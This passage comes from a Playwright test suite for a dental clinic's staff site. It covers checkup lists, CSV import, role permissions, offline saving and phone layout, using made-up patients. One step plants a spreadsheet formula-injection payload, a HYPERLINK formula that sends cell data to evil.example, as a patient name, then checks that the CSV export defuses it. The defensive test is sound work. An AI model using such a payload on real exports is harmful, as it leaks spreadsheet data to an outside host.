  assert.equal(await pk.evaluate(() => document.activeElement?.textContent), 'Next', 'focus stays on the pressed button');
  assert.deepEqual((await pk.locator('table.checkup-table thead th').allInnerTexts()).slice(0, 7).map((t) => t.trim()), ['Date', 'Patient', 'Branch', 'Treatment', 'Follow-up', 'Notes', 'Source'], 'one word, Treatment, as on the Aaj ki List');
  assert.match(await pk.evaluate(() => location.hash), /page=2/);
  await pk.getByRole('button', { name: 'Previous' }).click();
  await pk.waitForFunction(() => document.querySelector('.pager-info')?.textContent.includes('Showing 1-50'));
  assert.equal(await rowsOf(pk).count(), 50);
  await shot(pk, '15-checkups-page');
});
await step('Checkups page: Tab down the table never leaves the focused control under the paging bar', async () => {
  await pk.getByLabel('Name or phone').focus();
  let covered = 0;
  let farthest = 0;
  for (let i = 0; i < 90; i += 1) {
    await pk.keyboard.press('Tab');
    const seen = await pk.evaluate(() => {
      const a = document.activeElement;
      const p = document.querySelector('.pager');
      if (!a || !p || a === document.body || p.contains(a)) return null;
      const ar = a.getBoundingClientRect();
      const pr = p.getBoundingClientRect();
      return { hidden: ar.height > 0 && ar.bottom > pr.top + 1 && ar.top < pr.bottom - 1, y: window.scrollY };
    });
    if (seen?.hidden) covered += 1;
    farthest = Math.max(farthest, seen?.y || 0);
  }
  assert.ok(farthest > 100, 'tabbing went down the page (' + farthest + 'px)');
  assert.equal(covered, 0, covered + ' Tab stops landed under the paging bar');
  await pk.evaluate(() => window.scrollTo(0, 0));
});
await step('Checkups page: the less-used filters sit behind "More filters", which opens by itself when one of them is in use', async () => {
  const more = pk.locator('details.checkup-more');
  assert.equal(await more.evaluate((el) => el.open), false, 'closed by default');
  assert.equal(await pk.locator('.checkup-filters').getByLabel('Branch').isVisible(), false);
  assert.ok(await pk.locator('.checkup-filters').getByLabel('Follow-up').isVisible(), 'Follow-up stays in sight');
  assert.ok(await pk.getByLabel('Name or phone').isVisible());
  assert.equal(await more.locator('summary').innerText(), 'More filters');
  await moreFilters(pk);
  assert.ok(await pk.locator('.checkup-filters').getByLabel('Branch').isVisible());
  await pk.goto(BASE + '#/staff/checkups?source=archive');
  await pk.waitForFunction(() => document.querySelector('details.checkup-more')?.open === true && document.querySelector('.checkup-table-wrap')?.getAttribute('aria-busy') === 'false');
  assert.equal(await pk.locator('details.checkup-more summary').innerText(), 'More filters (1 in use)');
  await pk.getByRole('button', { name: 'Clear filters' }).click();
  await pk.waitForFunction(() => document.querySelector('details.checkup-more summary')?.textContent === 'More filters');
});
await step('Checkups page: a piece of a phone number with fewer than 4 digits says why nothing is found', async () => {
  await pk.getByLabel('Name or phone').fill('555');
  await pk.locator('.empty:has-text("No checkups match these filters.")').waitFor();
  assert.match(await pk.locator('.empty').innerText(), /To search by phone, type at least 4 digits\./);
  assert.match(await pk.locator('main').innerText(), /Part of the name, or at least 4 digits of the phone\./, 'the hint is under the box all the time');
  assert.equal(await pk.getByLabel('Name or phone').getAttribute('aria-describedby'), 'checkup-search-hint');
  await pk.getByLabel('Name or phone').fill('5550');
  await pk.waitForFunction(() => document.querySelectorAll('table.checkup-table tbody tr[data-id]').length > 0);
  await pk.getByRole('button', { name: 'Clear filters' }).click();
  await pk.waitForFunction(() => document.querySelector('.pager-info')?.textContent.includes('Showing 1-50'));
});
await step('Checkups page: search by name or phone, filters, and "Clear filters"', async () => {
  const total = await pagerTotal(pk);
  const first = await rowsOf(pk).first().locator('.checkup-name-text').innerText();
  await pk.getByLabel('Name or phone').fill(first);
  await pk.waitForFunction((name) => [...document.querySelectorAll('table.checkup-table tbody tr[data-id]')].every((t) => t.textContent.includes(name)) && document.querySelectorAll('table.checkup-table tbody tr[data-id]').length > 0, first);
  assert.ok((await pagerTotal(pk)) < total, 'the search narrows the list');
  assert.match(await pk.evaluate(() => location.hash), /q=/);
  await pk.getByRole('button', { name: 'Clear filters' }).click();
  await pk.waitForFunction((n) => document.querySelector('.pager-info')?.textContent.includes(`of ${n.toLocaleString('en-PK')}`), total);
  // a phone number written another way finds the same row (0300-555 and 0300555 are the same digits)
  const phoneText = await rowsOf(pk).first().locator('.phone-link').innerText();
  const digits = phoneText.replace(/\D/g, '');
  await pk.getByLabel('Name or phone').fill(`+92 ${digits.slice(1, 4)}-${digits.slice(4)}`);
  await pk.waitForFunction((d) => [...document.querySelectorAll('table.checkup-table tbody tr[data-id] .phone-link')].some((e) => e.textContent.replace(/\D/g, '') === d), digits);
  await pk.getByRole('button', { name: 'Clear filters' }).click();
  await pk.waitForFunction((n) => document.querySelector('.pager-info')?.textContent.includes(`of ${n.toLocaleString('en-PK')}`), total);
  // Follow-up filter
  await pk.locator('.checkup-filters').getByLabel('Follow-up').selectOption('Interested');
  await pk.waitForFunction((n) => !document.querySelector('.pager-info')?.textContent.includes(`of ${n.toLocaleString('en-PK')}`), total);
  const values = await pk.locator('table.checkup-table tbody select[aria-label^="Follow-up status for"]').evaluateAll((els) => els.map((e) => e.value));
  assert.ok(values.length > 0 && values.every((v) => v === 'Interested'), 'only Interested rows');
  // Month range and Source filter
  await pk.getByRole('button', { name: 'Clear filters' }).click();
  await moreFilters(pk);
  await pk.locator('.checkup-filters').getByLabel('Source').selectOption('archive');
  await pk.waitForFunction(() => document.querySelector('.pager-info')?.textContent.includes('Showing'));
  const sources = await pk.locator('table.checkup-table tbody tr[data-id] td:nth-child(7)').allInnerTexts();
  assert.ok(sources.length > 0 && sources.every((t) => /^Old list/.test(t.trim())), 'only old-list rows');
  await pk.getByRole('button', { name: 'Clear filters' }).click();
  await moreFilters(pk);
  await pk.locator('.checkup-filters').getByLabel('Patient file').selectOption('yes');
  await pk.waitForFunction(() => document.querySelectorAll('table.checkup-table tbody tr[data-id] a.mr').length > 0);
  assert.ok((await rowsOf(pk).count()) >= 1);
  await pk.getByRole('button', { name: 'Clear filters' }).click();
  await pk.waitForFunction((n) => document.querySelector('.pager-info')?.textContent.includes(`of ${n.toLocaleString('en-PK')}`), total);
});
await step('Checkups page: a follow-up status and a note save, and are still there after leaving the page and coming back', async () => {
  const row = rowsOf(pk).first();
  const name = await row.locator('.checkup-name-text').innerText();
  const id = await row.getAttribute('data-id');
  const current = await row.locator('select[aria-label^="Follow-up status for"]').inputValue();
  const target = current === 'Scheduled' ? 'No Response' : 'Scheduled';
  await row.locator('select[aria-label^="Follow-up status for"]').selectOption(target);
  await row.locator('.saved-mark').waitFor({ state: 'visible' });
  assert.match(await row.locator('.saved-mark').innerText(), /Saved/, 'the person sees that the status is saved');
  await row.locator('input[aria-label^="Notes for"]').fill('Call back on Monday (test)');
  await pk.waitForTimeout(1200);
  assert.equal((await pk.locator('.save-state').innerText()).trim(), 'All changes saved');
  await pk.locator('.topnav a:has-text("Today")').click();
  await pk.waitForSelector('.stat');
  await openCheckups(pk);
  await pk.getByLabel('Name or phone').fill(name);
  await pk.waitForSelector(`table.checkup-table tbody tr[data-id="${id}"]`);
  const back = pk.locator(`table.checkup-table tbody tr[data-id="${id}"]`);
  assert.equal(await back.locator('select[aria-label^="Follow-up status for"]').inputValue(), target);
  assert.equal(await back.locator('input[aria-label^="Notes for"]').inputValue(), 'Call back on Monday (test)');
  // the Edit dialog changes the fee and the doctor
  await back.getByRole('button', { name: /^Edit / }).click();
  const m = pk.locator('.modal');
  assert.ok(await m.getByLabel('Treatment', { exact: true }).count(), 'the Edit dialog says Treatment too');
  await m.getByLabel(/Estimated fee/).fill('12000');
  await m.getByLabel("Doctor's name").fill('Dr. Hina (sample)');
  await m.getByRole('button', { name: 'Save' }).click();
  await pk.waitForSelector('.toast:has-text("saved")');
  await pk.waitForSelector('.modal', { state: 'detached' });
  assert.match(await pk.locator(`table.checkup-table tbody tr[data-id="${id}"]`).innerText(), /Dr\. Hina \(sample\)/);
  await pk.getByRole('button', { name: 'Clear filters' }).click();
});
await step('Checkups page: "+ Add checkup" adds an earlier day to the list', async () => {
  await pk.getByRole('button', { name: '+ Add checkup' }).click();
  const m = pk.locator('.modal');
  await m.getByLabel(/^Name/).fill('Page Added Person');
  await m.getByLabel(/^Phone number/).fill('0300 5550102');
  await m.getByLabel(/^Date/).fill('2026-09-01');
  await m.getByLabel('Follow-up status').selectOption('Interested');
  await m.getByRole('button', { name: 'Add checkup patient' }).click();
  await pk.waitForSelector('.modal', { state: 'detached' });
  await pk.getByLabel('Name or phone').fill('Page Added Person');
  const row = rowsOf(pk).filter({ hasText: 'Page Added Person' });
  await row.waitFor();
  assert.match(await row.innerText(), /1 Sep[a-z]* 2026/);
  await pk.waitForFunction(() => document.querySelector('.page-head p')?.textContent.trim() === '1 checkup patient matches these filters');   // one match reads in the singular
  assert.equal(await row.locator('select[aria-label^="Follow-up status for"]').inputValue(), 'Interested');
  assert.match(await row.innerText(), /Website/);
  await pk.getByRole('button', { name: 'Clear filters' }).click();
});
await step("Checkups page: \"+ Add checkup\" flags a phone number already on that branch's list for the day, and the flag follows the date", async () => {
  await pk.getByRole('button', { name: '+ Add checkup' }).click();
  const m = pk.locator('.modal');
  await m.getByLabel(/^Name/).fill('Page Added Person');
  await m.getByLabel(/^Phone number/).fill('0300 5550102');
  await m.getByLabel(/^Date/).fill('2026-09-01');
  await m.getByLabel(/^Phone number/).press('Tab');
  await m.locator('.alert-warning:has-text("Already on the list for 1 Sep")').waitFor();
  await m.getByLabel(/^Date/).fill('2026-08-31');
  await pk.waitForFunction(() => !document.querySelector('.modal')?.textContent.includes('Already on the list for'));
  assert.match(await m.innerText(), /Goes on the Checkups page, and on that branch's Aaj ki List for the day you choose\./);
  await m.getByRole('button', { name: 'Cancel' }).click();
  await pk.waitForSelector('.modal', { state: 'detached' });
});
await step('Checkups page: "Register" gives a patient file and an Mr#; the row then links to the patient and offers no second Register', async () => {
  await moreFilters(pk);
  await pk.locator('.checkup-filters').getByLabel('Patient file').selectOption('no');
  await pk.waitForFunction(() => document.querySelector('.checkup-table-wrap')?.getAttribute('aria-busy') === 'false' && document.querySelector('table.checkup-table tbody tr[data-id]') && !document.querySelector('table.checkup-table tbody a.mr'));
  const row = rowsOf(pk).first();
  const id = await row.getAttribute('data-id');
  await row.getByRole('button', { name: /^Register / }).click();
  const m = pk.locator('.modal');
  await m.getByRole('button', { name: 'Create patient file' }).waitFor();
  assert.match(await m.innerText(), /This creates a patient file for .+ with the next Mr#, using this name, phone and branch[.] Use it when they start treatment[.]/);
  await m.getByRole('button', { name: 'Create patient file' }).click();
  await m.locator('.registered-mr').waitFor();
  const mr = (await m.locator('.registered-mr').innerText()).match(/Registered: Mr# (\d+)/)[1];
  assert.ok(await m.getByRole('button', { name: 'Open patient file' }).count());
  await m.locator('button.btn', { hasText: 'Close' }).click();
  await pk.waitForSelector('.modal', { state: 'detached' });
  await pk.getByRole('button', { name: 'Clear filters' }).click();
  // the registered person is found again by the open row id
  const link = pk.locator(`table.checkup-table tbody tr[data-id="${id}"] a.mr`);
  if (!(await link.count())) {
    await moreFilters(pk);
    await pk.locator('.checkup-filters').getByLabel('Patient file').selectOption('yes');
    await pk.waitForSelector(`table.checkup-table tbody tr[data-id="${id}"] a.mr`);
  }
  assert.equal((await pk.locator(`table.checkup-table tbody tr[data-id="${id}"] a.mr`).innerText()).trim(), `Mr# ${mr}`);
  assert.equal(await pk.locator(`table.checkup-table tbody tr[data-id="${id}"]`).getByRole('button', { name: /^Register / }).count(), 0, 'a second Register is not offered');
  await pk.locator(`table.checkup-table tbody tr[data-id="${id}"] a.mr`).click();
  await pk.waitForSelector('h1:has-text("Mr# ' + mr + '"), main:has-text("Mr# ' + mr + '")');
});
await step('Checkups page: front desk has no "Download Excel"; the admin downloads a real workbook with the export header and every filtered row', async () => {
  await pk.route('**/xlsx.mjs', (r) => r.fulfill({
    contentType: 'text/javascript',
    body: 'export const utils = { book_new: () => ({ SheetNames: [], Sheets: {} }), aoa_to_sheet: (aoa) => ({ __aoa: aoa }), book_append_sheet: (wb, ws, name) => { wb.SheetNames.push(name); wb.Sheets[name] = ws; } };\n'
      + 'export function writeFile(wb, name) { window.__xlsx = { name, aoa: wb.Sheets[wb.SheetNames[0]].__aoa }; }\n',
  }));
  await openCheckups(pk);
  await pk.getByRole('button', { name: 'Clear filters' }).click().catch(() => {});
  const total = await pagerTotal(pk);
  await pk.getByRole('button', { name: 'Download Excel' }).click();
  await pk.waitForFunction(() => window.__xlsx);
  const x = await pk.evaluate(() => window.__xlsx);
  assert.match(x.name, /^checkups_ALL_\d{4}-\d{2}-\d{2}\.xlsx$/);
  assert.deepEqual(x.aoa[0], ['Month', 'Patient Name', 'Phone', 'City', 'Clinic', 'Doctor', 'Treatment / Checkup For', 'Est. Fee (Rs)', 'Status', 'Notes', 'Source Tab', 'Date', 'Day status', 'Treatment details', 'Source', 'Mr#', 'Added on']);
  assert.equal(x.aoa.length - 1, total, 'one line per checkup');
  assert.ok(x.aoa.slice(1).every((r) => typeof r[2] === 'string'), 'phones are text');
  // a narrower download follows the filters and names the branch
  await pk.evaluate(() => { window.__xlsx = null; });
  await moreFilters(pk);
  await pk.locator('.checkup-filters').getByLabel('Branch').selectOption({ label: 'North Nazimabad' });
  await pk.waitForFunction(() => document.querySelector('.pager-info')?.textContent.includes('Showing'));
  const nn = await pagerTotal(pk);
  await pk.getByRole('button', { name: 'Download Excel' }).click();
  await pk.waitForFunction(() => window.__xlsx);
  const y = await pk.evaluate(() => window.__xlsx);
  assert.match(y.name, /^checkups_NN_/);
  assert.equal(y.aoa.length - 1, nn);
  await pk.getByRole('button', { name: 'Clear filters' }).click();
  // the front desk of the first page has no download
  await page.goto(BASE + '#/staff/checkups');
  await page.waitForSelector('h1:has-text("Checkups")');
  await page.waitForSelector('table.checkup-table tbody tr[data-id]');
  assert.equal(await page.getByRole('button', { name: 'Download Excel' }).count(), 0);
  assert.ok(await page.getByRole('button', { name: '+ Add checkup' }).count(), 'but they may add a checkup');
});
await step('Admin -> Import -> "5. Checkup list": a file in the owner\'s layout is previewed and imported; the same file again adds nothing', async () => {
  await pk.goto(BASE + '#/staff/admin?tab=import');
  await pk.waitForSelector('h2:text("5. Checkup list")');
  const dash = '—';
  const csv = [
    'Checkup list (sample),,,,,,,,,,', 'Made-up names for the test only,,,,,,,,,,', ',,,,,,,,,,',
    'Month,Patient Name,Phone,City,Clinic,Doctor,Treatment / Checkup For,Est. Fee (Rs),Status,Notes,Source Tab',
    'Dec 2024,Import Test Alpha,0300-5550201,Karachi,RJ Mall,Dr. Ali Rashid (sample),Scaling,,Follow-up Sent,,Sample tab A',
    '2026-03-01,Import Test Beta,0300-5550202,Lahore,Lahore Gulberg,Dr. Nida (sample),Braces consult,8000,Interested,Wants to think,Sample tab B',
    `Not recorded,Import Test Gamma,0300-5550203,${dash},${dash},${dash},${dash},,Not Contacted,,Sample tab A`,
    'Jun 2025,Import Test Delta,0300-5550204,Karachi,North Nazimabad,,Checkup,,Started,,Sample tab C', ''].join('\n');
  const section = pk.locator('section.panel:has(h2:text("5. Checkup list"))');
  await section.locator('input[type=file]').setInputFiles({ name: 'checkups-sample.csv', mimeType: 'text/csv', buffer: Buffer.from(csv) });
  await section.getByRole('button', { name: 'Import 4 checkups' }).waitFor();
  // The box is emptied once the file is read: a browser sends no `change` for the very same file again, and this page promises that a second drop changes nothing.
  assert.deepEqual(await section.locator('input[type=file]').evaluate((el) => [el.value, el.files.length]), ['', 0], 'ready to take the same file again');
  const text = await section.innerText();
  assert.match(text, /4\s+ready to import/);
  assert.match(text, /1\s+without a month/);
  assert.match(text, /1\s+with a fee/);
  assert.match(text, /RJ Mall\s+Gulshan \(RJ Mall\)\s+1/, 'RJ Mall goes to the Gulshan branch');
  assert.match(text, /Lahore Gulberg\s+Gulberg Lahore\s+1/);
  assert.match(text, /\(empty\)\s+No branch\s+1/);
  assert.match(text, /Follow-up Sent\s+1/);
  assert.match(text, /Not Contacted\s+1/);
  assert.match(text, /Dec 2024 to Mar 2026/);
  await shot(pk, '16-import-checkups');
  await section.getByRole('button', { name: 'Import 4 checkups' }).click();
  await section.locator('.alert-info:has-text("Checkup list:")').waitFor();
  assert.match(await section.locator('.alert-info').innerText(), /4 added, 0 updated, 0 already there/);
  assert.ok(await section.locator('a:has-text("Open the checkup list")').count());
  await section.locator('input[type=file]').setInputFiles({ name: 'checkups-sample.csv', mimeType: 'text/csv', buffer: Buffer.from(csv) });
  await section.getByRole('button', { name: 'Import 4 checkups' }).waitFor();
  await section.getByRole('button', { name: 'Import 4 checkups' }).click();
  await section.locator('.alert-info:has-text("Checkup list:")').waitFor();
  const again = await section.locator('.alert-info').innerText();
  assert.match(again, /0 added/);
  assert.match(again, /4 already there/);
});
await step('Import: a file without the Patient Name and Phone header is refused in plain words', async () => {
  const section = pk.locator('section.panel:has(h2:text("5. Checkup list"))');
  await section.locator('input[type=file]').setInputFiles({ name: 'wrong.csv', mimeType: 'text/csv', buffer: Buffer.from('Colour,Size\nred,big\n') });
  await section.locator('.alert-stop:has-text("No checkup list found in this file")').waitFor();
  assert.match(await section.locator('.alert-stop').innerText(), /Patient Name and Phone/);
});
await step('Admin: the Aaj ki List "All branches" shows the checkup rows with their branch, and the day downloads with a type column', async () => {
  await pk.goto(BASE + '#/staff/sheet?branch=all');
  await pk.waitForSelector('th:text("Branch"):not([hidden])');
  await pk.waitForSelector('table.sheet tbody tr.is-checkup');
  const branches = await pk.locator('table.sheet tbody tr.is-checkup td:first-child').allInnerTexts();
  assert.ok(branches.length >= 3 && branches.every((b) => b.trim().length > 2), 'every checkup row names its branch');
  assert.ok(branches.some((b) => /North Nazimabad/.test(b)) && branches.some((b) => /Gulshan/.test(b)));
  assert.equal(await pk.locator('.add-panel:not([hidden])').count(), 0, 'no add panel in All branches');
  const [download] = await Promise.all([pk.waitForEvent('download'), pk.getByRole('button', { name: 'Download', exact: true }).click()]);
  const csv = fs.readFileSync(await download.path(), 'utf8').replace(/^﻿/, '');
  const [head, ...lines] = csv.split('\n');
  assert.match(head, /,type$/);
  assert.ok(lines.some((l) => /,Checkup$/.test(l)) && lines.some((l) => /,Patient$/.test(l)), 'both kinds of row');
});
await step('Aaj ki List download: a checkup patient named like a formula is written as text, not as a formula', async () => {
  const evil = '=HYPERLINK("https://evil.example/?d="&K2,"Open")';
  await pk.goto(BASE + '#/staff/sheet?branch=2');
  await pk.getByRole('button', { name: '+ Checkup patient' }).waitFor();
  await pk.getByRole('button', { name: '+ Checkup patient' }).click();
  const m = pk.locator('.modal');
  await m.getByLabel(/^Name/).fill(evil);
  await m.getByLabel(/^Phone number/).fill('0300 5550956');
  await m.getByRole('button', { name: 'Add checkup patient' }).click();
  await pk.waitForSelector('.toast:has-text("added as a checkup patient")');
  const row = pk.locator('table.sheet tbody tr.is-checkup', { has: pk.locator('input[aria-label^="Name of checkup patient =HYPERLINK"]') });
  await row.waitFor();
  const [download] = await Promise.all([pk.waitForEvent('download'), pk.getByRole('button', { name: 'Download', exact: true }).click()]);
  const csv = fs.readFileSync(await download.path(), 'utf8').replace(/^﻿/, '');
  const line = csv.split('\n').find((l) => l.includes('HYPERLINK'));
  assert.ok(line, 'the checkup patient is in the file');
  assert.ok(line.includes(',"\'=HYPERLINK(""https://evil.example/?d=""&K2,""Open"")",'), 'the cell starts with an apostrophe and is quoted: ' + line.slice(0, 80));
  assert.ok(csv.split('\n').every((l) => !/(^|,)[=@]/.test(l)), 'no cell of the file starts with = or @');
  // leave the list as it was
  await row.getByRole('button', { name: /Checkup options/ }).click();
  await pk.locator('.modal').getByRole('button', { name: 'Remove from the list' }).click();
  await pk.locator('.modal').getByRole('button', { name: 'Remove', exact: true }).click();
  await row.waitFor({ state: 'detached' });
});
await step('Checkups page: a note typed while offline is kept on this device and saved when the connection is back', async () => {
  await pk.goto(BASE + '#/staff/checkups');
  await pk.waitForSelector('table.checkup-table tbody tr[data-id]');
  const row = rowsOf(pk).first();
  const id = await row.getAttribute('data-id');
  await pk.context().setOffline(true);
  await pk.locator('.offline-banner:not([hidden])').waitFor();
  await row.locator('input[aria-label^="Notes for"]').fill('Typed offline (test)');
  await pk.waitForFunction(() => /Offline: 1 typed change/.test(document.querySelector('.save-state')?.textContent || ''));
  await pk.context().setOffline(false);
  await pk.waitForFunction(() => document.querySelector('.save-state')?.textContent.trim() === 'All changes saved');
  await pk.goto(BASE + '#/staff/today');
  await pk.waitForSelector('.stat');
  await pk.goto(BASE + '#/staff/checkups');
  await pk.waitForSelector(`table.checkup-table tbody tr[data-id="${id}"]`);
  assert.equal(await pk.locator(`table.checkup-table tbody tr[data-id="${id}"] input[aria-label^="Notes for"]`).inputValue(), 'Typed offline (test)');
});
await step('Edit on an old-list row tells Dr. Ali (and only Dr. Ali) that importing the file again adds the old spelling a second time', async () => {
  await pk.goto(BASE + '#/staff/checkups?q=Import%20Test%20Delta');
  await pk.waitForFunction(() => document.querySelectorAll('table.checkup-table tbody tr[data-id]').length === 1);
  await rowsOf(pk).first().getByRole('button', { name: /^Edit / }).click();
  assert.match(await pk.locator('.modal').innerText(), /This row came from the old list\. If you change the name or phone, importing that file again adds this person a second time\./);
  await pk.keyboard.press('Escape');
  await pk.waitForSelector('.modal', { state: 'detached' });
});
await step('Front desk (North Nazimabad) on the Checkups page sees the imported North Nazimabad row and the no-branch row, never the RJ Mall or Lahore rows, and cannot remove an old-list row', async () => {
  await pk.getByRole('button', { name: 'Try another role' }).click();
  await pk.waitForSelector('.topbar', { state: 'detached' });
  await pk.goto(BASE + '#/login/staff');
  await pk.getByRole('button', { name: /Front desk \(North Nazimabad\)/ }).click();
  await pk.waitForSelector('.topbar');
  await pk.goto(BASE + '#/staff/checkups');
  await pk.waitForSelector('table.checkup-table tbody tr[data-id]');
  await pk.getByLabel('Name or phone').fill('Import Test');
  await pk.waitForFunction(() => document.querySelectorAll('table.checkup-table tbody tr[data-id]').length === 2);
  const names = await pk.locator('table.checkup-table tbody tr[data-id] .checkup-name-text').allInnerTexts();
  assert.deepEqual(names.sort(), ['Import Test Delta', 'Import Test Gamma']);
  await pk.locator('table.checkup-table tbody tr[data-id]', { hasText: 'Import Test Delta' }).getByRole('button', { name: /^Edit / }).click();
  const m = pk.locator('.modal');
  assert.doesNotMatch(await m.innerText(), /old list/i, 'the note about importing the file again is for Dr. Ali, not for the front desk');
  assert.equal(await m.getByRole('button', { name: 'Remove' }).count(), 0, 'old-list rows are removed by Dr. Ali only');
  await pk.keyboard.press('Escape');
  // a row the front desk added on the website can be removed from the Edit dialog
  await pk.getByRole('button', { name: '+ Add checkup' }).click();
  await pk.locator('.modal').getByLabel(/^Name/).fill('Remove Me Person');
  await pk.locator('.modal').getByLabel(/^Phone number/).fill('0300 5550103');
  await pk.locator('.modal').getByRole('button', { name: 'Add checkup patient' }).click();
  await pk.waitForSelector('.modal', { state: 'detached' });
  await pk.getByLabel('Name or phone').fill('Remove Me Person');
  const mine = pk.locator('table.checkup-table tbody tr[data-id]', { hasText: 'Remove Me Person' });
  await mine.waitFor();
  await mine.getByRole('button', { name: /^Edit / }).click();
  await pk.locator('.modal').getByRole('button', { name: 'Remove' }).click();
  await pk.locator('.modal').getByRole('button', { name: 'Remove', exact: true }).click();
  await mine.waitFor({ state: 'detached' });
});


// Rows of the Aaj ki List history that have no Mr# are checkup patients: the import must never create a patient file for them.
const pi = await newPage();
await pi.route('**/js/data/index.js', (r) => r.fulfill({
  contentType: 'text/javascript',
  body: `import { DEMO_MODE } from '../config.js';
let p;
export function getData() {
  return (p ||= import('./demo.js').then(async (m) => {
    const d = await m.createDemoAdapter();
    const real = d.importAajSheet;
    d.importAajSheet = (rows, create) => { (window.__aajCalls ||= []).push({ create, mr: rows.map((x) => !!x[2]) }); return real(rows, create); };
    return d;
  }));
}
`,
}));
await step('Import "4. Aaj ki List history": rows without an Mr# never get a new patient file, rows with an Mr# keep the "Add patient records" choice', async () => {
  await loginAs(pi, 'Dr. Ali Rashid');
  await pi.goto(BASE + '#/staff/admin?tab=import');
  await pi.waitForSelector('h2:text("4. Aaj ki List history")');
  const csv = [
    "Tt Mr #,Tt Patient Name,Monthly,Tt Treatment,Token No,Waiting,Group,Doctor's Name,Tt Treatment Details,P.P,Healthwire,Tt Contact No,Reminder Status",
    '9811,Areeba Siddiqui,4,Monthly,3,Completed,,"Dr. Hina (sample)",U L 016 Pc refresh,,Done,,',
    ',Brand New Nobody,,Checkup,6,Completed,,Dr Nida,,,,0300 5559999,', ''].join('\n');
  const aaj = pi.locator('section.panel:has(h2:text("4. Aaj ki List history")) input[type=file]');
  await aaj.setInputFiles({ name: 'aaj-ki-list-sample.csv', mimeType: 'text/csv', buffer: Buffer.from(csv) });
  await pi.waitForSelector('section[data-tab]');
  await pi.locator('section[data-tab] select[aria-label^="Branch for"]').selectOption('2');
  await pi.locator('section[data-tab] input[type=date]').fill('2026-08-20');
  await pi.locator('section[data-tab] input[type=date]').dispatchEvent('change');
  const box = pi.locator('label:has-text("Rows without an Mr# are checkup patients") input[type=checkbox]');
  assert.ok(await box.isChecked(), 'the box stays ticked by default');
  await pi.getByRole('button', { name: 'Import 2 visits' }).click();
  await pi.waitForSelector('.alert:has-text("Visits:")');
  assert.deepEqual(await pi.evaluate(() => window.__aajCalls), [{ create: true, mr: [true] }, { create: false, mr: [false] }]);
  await pi.locator('.topsearch input').fill('Brand New Nobody');
  await pi.locator('.search-results:has-text("No patient matches")').waitFor();
});

// ------------------------------------------------------------- the database update has not been run yet (the site keeps working)
const pm = await newPage();
// The demo is cut off from the checkup functions, as the live site is before the two migrations are applied.
await pm.route('**/js/data/index.js', (r) => r.fulfill({
  contentType: 'text/javascript',
  body: `import { DEMO_MODE } from '../config.js';
let p;
export function getData() {
  return (p ||= import('./demo.js').then(async (m) => {
    const d = await m.createDemoAdapter();
    const gone = () => { throw Object.assign(new Error('CHECKUPS_MISSING: the checkup list is not switched on yet. It appears once the database update has been run.'), { code: 'CHECKUPS_MISSING' }); };
    d.listDayCheckups = async () => Object.assign([], { missing: true });
    for (const k of ['listCheckups', 'exportCheckups', 'addCheckup', 'updateCheckup', 'deleteCheckup', 'registerCheckupAsPatient', 'linkCheckupToPatient', 'importCheckups']) d[k] = gone;
    d.subscribeCheckups = () => () => {};
    return d;
  }));
}
`,
}));
await step('before the database update: the Aaj ki List works without checkup rows or "+ Checkup patient", and the Checkups page says it is not switched on yet', async () => {
  await loginAs(pm, 'Front desk \\(North Nazimabad\\)');
  await pm.goto(BASE + '#/staff/sheet');
  await pm.waitForSelector('table.sheet tbody tr');
  assert.equal(await pm.locator('table.sheet tbody tr.is-checkup').count(), 0);
  assert.equal(await pm.getByRole('button', { name: '+ Checkup patient' }).count(), 0);
  assert.ok(await pm.getByRole('button', { name: '+ New walk-in' }).count(), 'the walk-in button stays');
  assert.doesNotMatch(await pm.locator('.page-head p').innerText(), /checkups/);
  await pm.goto(BASE + '#/staff/checkups');
  await pm.waitForSelector('.empty:has-text("not switched on yet")');
  assert.equal(await pm.getByRole('button', { name: '+ Add checkup' }).count(), 0);
});


// The checkups cannot be loaded for another reason: the visits still show, with a small warning.
const pe = await newPage();
await pe.route('**/js/data/index.js', (r) => r.fulfill({
  contentType: 'text/javascript',
  body: `import { DEMO_MODE } from '../config.js';
let p;
export function getData() {
  return (p ||= import('./demo.js').then(async (m) => {
    const d = await m.createDemoAdapter();
    d.listDayCheckups = async () => { throw new Error('The checkup list did not answer.'); };
    return d;
  }));
}
`,
}));
await step('when only the checkups fail to load, the Aaj ki List still shows the patients, with a warning above the table', async () => {
  await loginAs(pe, 'Front desk \\(North Nazimabad\\)');
  await pe.goto(BASE + '#/staff/sheet');
  await pe.waitForSelector('table.sheet tbody tr');
  await pe.locator('.alert-warning:has-text("Checkup patients could not be loaded: The checkup list did not answer.")').waitFor();
  assert.ok((await pe.locator('table.sheet tbody tr:not(.is-checkup)').count()) >= 5, 'the patients are there');
  assert.ok(await pe.getByRole('button', { name: '+ New walk-in' }).count());
});

// A person who may view the list but not edit it (the accountant): everything is read-only.
const pa = await newPage();
await step('Checkups page for a person who may only view: no add, edit or register buttons, and the cells are read-only', async () => {
  await loginAs(pa, 'Accountant');
  await pa.goto(BASE + '#/staff/checkups');
  await pa.waitForSelector('table.checkup-table tbody tr[data-id]');
  assert.equal(await pa.getByRole('button', { name: '+ Add checkup' }).count(), 0);
  assert.equal(await pa.locator('table.checkup-table').getByRole('button', { name: /^(Register|Edit) / }).count(), 0);
  assert.ok(await pa.locator('table.checkup-table tbody tr[data-id]').first().locator('select[aria-label^="Follow-up status for"]').isDisabled());
  assert.ok(await pa.locator('table.checkup-table tbody tr[data-id]').first().locator('input[aria-label^="Notes for"]').isDisabled());
});

// ------------------------------------------------------------- phone width
const pp = await newPage({ width: 375, height: 812 });
const noSideScroll = async (pg) => assert.ok(await pg.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth + 1), 'the page itself does not scroll sideways');
await step('phone: the Checkups page and the Aaj ki List with checkup rows fit the screen', async () => {
  await loginAs(pp, 'Front desk \\(North Nazimabad\\)');
  await pp.goto(BASE + '#/staff/checkups');
  await pp.waitForSelector('table.checkup-table tbody tr[data-id]');
  await noSideScroll(pp);
  assert.ok(await pp.getByLabel('Name or phone').isVisible());
  assert.ok(await pp.getByRole('button', { name: 'Next' }).isVisible() || (await pp.locator('.pager-info').isVisible()));
  await shot(pp, '17-checkups-phone');
  await pp.goto(BASE + '#/staff/sheet');
  await pp.waitForSelector('table.sheet tbody tr.is-checkup');
  await noSideScroll(pp);
  await shot(pp, '18-sheet-checkups-phone');
});

await step('phone: the Patient column of the Checkups page stays at the left edge while the other columns scroll sideways', async () => {
  await pp.goto(BASE + '#/staff/checkups');
  await pp.waitForSelector('table.checkup-table tbody tr[data-id]');
  const pinned = await pp.evaluate(() => {
    const wrap = document.querySelector('.checkup-table-wrap');
    wrap.scrollLeft = wrap.scrollWidth;
